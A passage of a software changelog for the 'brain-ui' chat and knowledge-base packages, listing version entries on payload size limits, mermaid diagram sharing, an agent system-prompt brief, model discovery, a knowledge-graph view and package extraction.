    (`?raw=1`) stream from disk and were never bounded by it, so this only ever
    affected text previews.
  - Render/share content 512KB → 4MB. That bound predated inlined assets: a
    shared document carries `data:` image URIs and pre-rendered mermaid SVGs,
    which pass 512KB without the prose being long. It is an HTTP body, not a
    socket frame.

  Left alone: `MAX_WS_MESSAGE_BYTES` (512KB, server → client). That one bounds
  what the browser renders and what reverse proxies will pass, which is a
  different risk than what the user can send.

## 0.10.0

## 0.9.0

### Minor Changes

- 1f7e6a3: Added: mermaid diagrams get their own share menu (PNG / PDF / SVG / source) and a
  full-screen pan-and-zoom viewer, opened by tapping the diagram.
  Added: a chat-surface brief appended to the agent's system prompt —
  `buildSystemPromptAppend({ client, tools })` — covering diagrams, `<share>`
  blocks, wikilinks, raw-HTML and tool-narration rules, the ask-user and location
  tools, and what the reader's device can do. Each backend declares its own tool
  names (pi has no location tool), and both take a `systemPromptAppend` option to
  override the whole brief.
  Added: `chat_message` frames carry an optional `client` field
  (`ClientEnvironment`: form factor, touch, standalone, camera, microphone,
  geolocation, share sheet, viewport, locale, timezone), feature-detected in the
  browser and validated strictly at the boundary. The Claude backend rebuilds its
  system-prompt append per turn from it.
  Changed: diagrams render in a theme built from the app's own tokens instead of
  mermaid's stock dark/neutral themes; exports use the matching light theme.
  Changed: `MermaidTheme` is now `"dark" | "light"` (was `"dark" | "neutral"`),
  `ShareMenu`'s `renderTrigger` also receives `status` and `icon`, and the
  server-internal `handleChatMessage` takes an options object.

## 0.8.0

## 0.7.2

## 0.7.1

## 0.7.0

### Minor Changes

- b8cbf72: Knowledge-graph view: `brain graph` command and schema-v8 derived tables
  (metrics, communities, root distances, precomputed ForceAtlas2 layout) built
  at index time; `/api/graph/*` REST endpoints served from read-only brain.db
  access; a full-screen GraphPage with Clusters, Discovery, Local, and
  Maintenance modes rendered via a lazy-loaded sigma.js WebGL canvas.

## 0.6.3

## 0.6.2

## 0.6.1

## 0.6.0

## 0.5.1

## 0.5.0

### Minor Changes

- 2904074: - Added: the model picker is discovered from the Anthropic Models API, so a new
  model appears without an env edit or a redeploy.
  - Added: a Settings screen (Models | Security) to hide models from the picker
    and refresh the list on demand.
  - Added: `BRAIN_UI_MODEL_DISCOVERY` and `BRAIN_UI_MODEL_TTL_HOURS`.
  - Changed: `BRAIN_UI_CLAUDE_PROFILES` is now only for non-Anthropic endpoints
    and for overriding a discovered model.
  - Changed: `useUIStore`'s `securityPanelOpen` / `toggleSecurityPanel` /
    `setSecurityPanelOpen` are now `settingsPanelOpen` / `toggleSettingsPanel` /
    `setSettingsPanelOpen`.

## 0.4.0

### Minor Changes

- 2c42696: Extract the brain-ui deployment into two reusable packages.

  - **New `@schlessera/brain-ui-server`**: Hono app factory (`createApp`) with
    auth (password/passkeys/tailscale/proxy), the WebSocket turn coordinator
    (decomposed into explicit host objects: `WsHost`, `TurnCoordinator`,
    `SessionCatalog`), session catalog with bundled SQLite migrations, brain/
    files/voice routes, and injected seams for the static client build and the
    PNG/PDF renderer.
  - **New `@schlessera/brain-ui-react`**: the chat/files/voice React components,
    stores, and WS transport. The chat store now keeps a transcript buffer per
    session (plus a draft buffer), so background sessions accumulate instead of
    being discarded. Ships prebuilt JS + d.ts, a precompiled `styles.css`, and a
    `theme.css` source entry for Tailwind v4 consumers. Branding copy is
    configurable via `configureBrainUi()`.
  - **ui-sdk**: add `PasskeySummary` to the protocol (REST payload of the
    passkey management routes, previously local to brain-ui).

## 0.3.0

## 0.2.1

### Patch Changes

- Republish with correct internal dependency pins. The 0.2.0 manifests pinned
  cross-dependencies to 0.1.0, a version that was never published, making five
  of the eight packages uninstallable.

## 0.2.0

### Minor Changes

- rename brainform to brain-kit
